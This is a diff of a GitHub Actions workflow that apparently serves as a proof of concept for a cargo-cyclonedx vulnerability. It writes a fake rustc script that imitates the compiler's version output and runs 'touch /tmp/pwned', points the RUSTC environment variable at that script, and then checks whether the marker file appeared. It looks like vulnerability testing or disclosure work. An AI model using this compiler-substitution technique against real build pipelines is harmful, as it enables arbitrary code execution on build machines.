@@ -1,26 +1,28 @@
-
-name: Test Cargo CycloneDX RUSTC Injection
-
-on: [push, pull_request]  # ⚠️ Runs on PRs (potential security risk)
-
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v2
-
-      - name: Install Cargo CycloneDX
-        run: cargo install cargo-cyclonedx
-
       - name: Generate SBOM (Test Exploit)
         run: |
           echo '#!/bin/bash' > fake_rustc
-          echo 'echo "HACKED" >&2' >> fake_rustc  # Arbitrary command execution
-          echo 'touch /tmp/pwned' >> fake_rustc   # Proof of execution
+          echo 'if [[ "$*" == *"--print=file-names"* ]]; then' >> fake_rustc
+          echo '    echo "libtest.rlib"' >> fake_rustc  # Fake expected output
+          echo 'else' >> fake_rustc
+          echo '    echo "rustc 1.72.0 (123456789 2024-01-01)"' >> fake_rustc
+          echo '    echo "binary: rustc"' >> fake_rustc
+          echo '    echo "commit-hash: 123456789abcdef"' >> fake_rustc
+          echo '    echo "commit-date: 2024-01-01"' >> fake_rustc
+          echo '    echo "host: x86_64-unknown-linux-gnu"' >> fake_rustc
+          echo '    echo "release: 1.72.0"' >> fake_rustc
+          echo '    echo "LLVM version: 16.0.6"' >> fake_rustc
+          echo 'fi' >> fake_rustc
+          echo 'touch /tmp/pwned' >> fake_rustc  # Arbitrary command execution
           chmod +x fake_rustc
           
-          RUSTC=./fake_rustc cargo cyclonedx --verbose
+          RUSTC=./fake_rustc cargo cyclonedx --verbose || true  # Prevents CI failure
 
       - name: Check if Exploit Worked
-        run: ls -l /tmp/pwned  # If this file exists, the exploit was successful!
+        run: |
+          if [ -f /tmp/pwned ]; then
+            echo "🔥 Exploit SUCCESSFUL: Arbitrary command executed"
+            exit 0
+          else
+            echo "❌ Exploit FAILED: No command execution detected"
+            exit 1
+          fi
